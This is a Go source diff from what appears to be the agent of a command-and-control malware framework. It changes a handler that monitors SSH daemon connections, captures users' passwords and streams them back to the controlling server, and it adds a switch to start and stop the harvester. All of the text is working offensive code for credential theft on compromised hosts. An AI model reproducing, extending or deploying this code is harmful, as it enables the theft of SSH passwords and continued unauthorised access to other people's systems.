@@ -4,6 +4,7 @@
 package agent
 
 import (
+	"context"
 	"encoding/hex"
 	"fmt"
 	"log"
@@ -42,6 +43,7 @@ func platformC2CommandsHandler(cmdSlice []string, cmd_id string) (out string) {
 		// Starts monitoring SSH connections and logs passwords.
 		code_pattern := flags.StringP("code_pattern", "p", "", "Code pattern")
 		reg_name := flags.StringP("reg_name", "r", "RBP", "Register name")
+		stop := flags.BoolP("stop", "s", false, "Stop the harvester")
 		flags.Parse(cmdSlice[1:])
 		code_pattern_bytes, err := hex.DecodeString(*code_pattern)
 		if err != nil {
@@ -49,12 +51,20 @@ func platformC2CommandsHandler(cmdSlice []string, cmd_id string) (out string) {
 			return
 		}
 
+		if SshHarvesterCtx == nil {
+			SshHarvesterCtx, SshHarvesterCancel = context.WithCancel(context.Background())
+		}
+		if *stop {
+			SshHarvesterCancel()
+			out = "SSH harvester stopped"
+			return
+		}
 		harvester_log_stream := make(chan string, 4096)
 		go sshd_monitor(harvester_log_stream, code_pattern_bytes, *reg_name)
 		go func() {
-			for {
+			for SshHarvesterCtx.Err() == nil {
 				out = <-harvester_log_stream
-				sendResponse(out, cmd_id, cmdSlice)
+				SendCmdRespToCC(out, cmd_id, cmdSlice)
 			}
 		}()
 		return
